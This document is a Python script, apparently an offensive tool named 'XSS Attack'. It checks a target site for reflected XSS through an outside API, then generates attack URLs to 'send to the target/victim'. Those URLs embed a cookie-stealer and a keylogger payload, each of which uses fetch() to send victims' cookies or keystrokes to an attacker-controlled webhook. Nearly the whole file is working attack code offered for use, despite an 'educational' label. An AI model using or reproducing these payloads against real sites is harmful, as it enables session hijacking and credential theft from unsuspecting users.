#!/usr/bin/env python3
import sys
import requests
import argparse
from colorama import init, Fore, Style
import urllib.parse
#from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote_plus

init(autoreset=True)

BANNER = f'''
{Fore.CYAN} __  _____ ___ ___              
 \ \/ / __/ __| _ \__ __ ___ _  
  >  <\__ \__ \  _/\ V  V / ' \ 
 /_/\_\___/___/_|   \_/\_/|_||_|
------------------------------------------------
{Fore.GREEN}[*] XSS Attack - by GH0STH4CKER
[*] Use at your own risk. 
---------------------------------------------
{Style.RESET_ALL}
'''

API_ENDPOINT = "https://check4xss.vercel.app/check_xss?url="

def check_internet():
    try:
        requests.get("https://www.google.com", timeout=5)
        return True
    except requests.RequestException:
        return False

def extract_search_url(html):
    """
    Extract Search URL from the API's HTML response.
    """
    marker = "<strong>Search URL:</strong>"
    start = html.find(marker)
    if start == -1:
        return None
    start += len(marker)
    end = html.find("</p>", start)
    if end == -1:
        return None
    import re
    snippet = html[start:end].strip()
    clean = re.sub('<.*?>', '', snippet)
    return clean

def check_xss_reflection(target_url):
    print(f"{Fore.YELLOW}[*] Querying XSS check API for: {target_url}{Style.RESET_ALL}")
    try:
        api_url = API_ENDPOINT + target_url
        response = requests.get(api_url, timeout=15)
        response.raise_for_status()
        html = response.text

        search_url = extract_search_url(html)
        if search_url:
            print(f"{Fore.CYAN}[+] Search URL pattern found:\n    {search_url}{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[!] Could not extract Search URL pattern.{Style.RESET_ALL}")

        if "XSS payload was reflected" in html:
            print(f"{Fore.GREEN}[+] XSS payload reflected! Potential vulnerability detected.{Style.RESET_ALL}")
            return True
        elif "XSS payload was not reflected" in html:
            print(f"{Fore.RED}[-] XSS payload not reflected. Target likely not vulnerable.{Style.RESET_ALL}")
            return False
        else:
            print(f"{Fore.YELLOW}[!] Unexpected API response.{Style.RESET_ALL}")
            return False
    except requests.RequestException as e:
        print(f"{Fore.RED}[!] API query error: {e}{Style.RESET_ALL}")
        return False

def build_attack_payloads(webhook):
    """
    Returns a dictionary of simulated attacks with payloads
    """
    return {
        "cookie_stealer": f"<script>fetch('{webhook}?cookie='+document.cookie)</script>",
        "keylogger": (
            "<script>"
            "document.addEventListener('keydown', function(e) {"
            f"fetch('{webhook}?key='+e.key);"
            "});"
            "</script>"
        ),
        "custom_alert": "<script>alert('Custom JS injected!');</script>"
    }

def simulate_attack(search_url_pattern, webhook):
    attacks = build_attack_payloads(webhook)

    if not search_url_pattern:
        print("No vulnerable URL pattern detected, cannot generate payload URLs.")
        return

    print(f"\n{Fore.MAGENTA}[*] Payloads generated. Copy the URL(s) below and send to the target/victim.{Style.RESET_ALL}")

    for attack_name, payload in attacks.items():
        label = attack_name.replace("_", " ").title()

        # Replace the placeholder "QU3RY" with URL-encoded payload
        if "QU3RY" in search_url_pattern:
            attack_url = search_url_pattern.replace("QU3RY", urllib.parse.quote(payload))
        else:
            # If placeholder not found, fallback to appending
            sep = '&' if '?' in search_url_pattern else '?'
            attack_url = f"{search_url_pattern}{sep}xss={urllib.parse.quote(payload)}"

        print(f"\n{Fore.CYAN}--- {label} Payload ---{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}{attack_url}{Style.RESET_ALL}")

def main():
    print(BANNER)

    parser = argparse.ArgumentParser(description="XSS Attack Simulator - Educational Testing Tool")
    parser.add_argument('-u', '--url', required=True, help='Target URL to check and simulate attacks')
    parser.add_argument('-w', '--webhook', required=True, help='Webhook URL to receive stolen data (e.g., from webhook.site)')
    args = parser.parse_args()
    
    target_url, webhook = args.url, args.webhook

    print(f"{Fore.YELLOW}[*] Checking internet connection...{Style.RESET_ALL}")
    if check_internet():
        print(f"{Fore.GREEN}[+] Internet connection is ON{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}[+] Internet connection is OFF. Please connect and retry.")
        sys.exit(1)

    print(f"{Fore.YELLOW}[*] Checking site accessibility: {target_url}{Style.RESET_ALL}")
    try:
        head_resp = requests.head(target_url, timeout=10, allow_redirects=True)
        if head_resp.status_code == 200:
            print(f"{Fore.GREEN}[+] Site is accessible{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[+] Site not accessible (status code: {head_resp.status_code}){Style.RESET_ALL}")
            sys.exit(1)
    except requests.RequestException as e:
        print(f"{Fore.RED}[+] Site not accessible: {e}{Style.RESET_ALL}")
        sys.exit(1)

    vulnerable = check_xss_reflection(target_url)

    if vulnerable:
        # Fetch search URL pattern for reflection point
        api_resp = requests.get(API_ENDPOINT + target_url, timeout=15).text
        search_url_pattern = extract_search_url(api_resp)
        simulate_attack( search_url_pattern, webhook)
    else:
        print(f"{Fore.YELLOW}[!] Exiting: Target not vulnerable to reflected XSS.{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
